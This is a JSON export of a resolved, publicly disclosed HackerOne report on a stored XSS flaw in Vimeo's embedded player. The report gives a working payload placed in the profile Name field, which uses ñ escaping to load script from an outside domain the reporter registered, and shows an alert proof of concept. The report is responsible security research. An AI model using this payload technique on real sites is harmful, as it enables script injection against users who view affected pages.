{
  "id": 85488,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTQ4OA==",
  "url": "https://hackerone.com/reports/85488",
  "title": "Stored XSS on player.vimeo.com",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-08-29T08:49:17.806Z",
  "submitted_at": "2015-08-29T08:49:17.806Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "stefanovettorazzi",
    "url": "/stefanovettorazzi",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/2udi3vbdhzbpwjlrvhxisg1q29dk/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 56,
    "url": "https://hackerone.com/vimeo",
    "handle": "vimeo",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Vimeo",
      "twitter_handle": "vimeo",
      "website": "https://vimeo.com",
      "about": "Make life worth watching"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-08-31T10:29:27.840Z",
  "bug_reporter_agreed_on_going_public_at": "2017-08-01T10:29:17.460Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "__Description__\r\n\r\nThe page loaded for the Vimeo embedded player prints the Name of the owner of the video in Javascript context. Some characters are escaped, like `\"` but others like `>`, `<` and `/` are not. So, you can insert your own HTML tags like `</script><script src=\"//domain\">` and - if the video is public - any Vimeo user can be affected by the Javascript code that is loaded.\r\nHowever, there is a limitation: the maximum length of Name is 32 characters. But, it's not impossible to circumvent this limitation on Chrome and Safari. One way that I figured out to exploit this vulnerability, is taking advantage that the character `ñ` is printed as `\\u00f1` in the page of the embedded player and that Chrome and Safari take `/\\u00f1` as `//u00f1`. \r\n\r\n__Proof of concept__\r\nReproducible on Chrome.\r\n1. Go to https://vimeo.com/settings.\r\n2. For _Name_ enter `</script><script src=/ñ.xyz>`.\r\n3. Click _Save Changes_.\r\n4. Upload a video and get the numeric identification of the video from the path like https://vimeo.com/137669589.\r\n5. I just registered the domain _u00f1.xyz_ but StartSSL is not resolving the domain yet, so I can't request a certificate until their DNS servers are updated. For this reason you first have to go to https://u00f1.xyz/, click _Advanced_ and click _Proceed to u00f1.xyz (unsafe)_. I will add a comment to this report as soon as I can install a valid certificate. Sorry for the problem.\r\n5. Go to https://player.vimeo.com/video/[numeric_identification_of_the_video].\r\n6. The content from https://u00f1.xyz is loaded.\r\n7. `alert(document.domain)` is executed.\r\n\r\nPlease, let me know if something is not clear.\r\nVideo player with the XSS working: https://player.vimeo.com/video/137669589",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-08-31T10:29:17.524Z",
  "allow_singular_disclosure_after": -254311806.78705198,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "sourc7",
    "thalaivar304",
    "0nlymohammed",
    "gamliel",
    "r3y",
    "eveeez",
    "detroitsmash",
    "dpgribkov",
    "hacklad",
    "shivammusic",
    "and 1 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
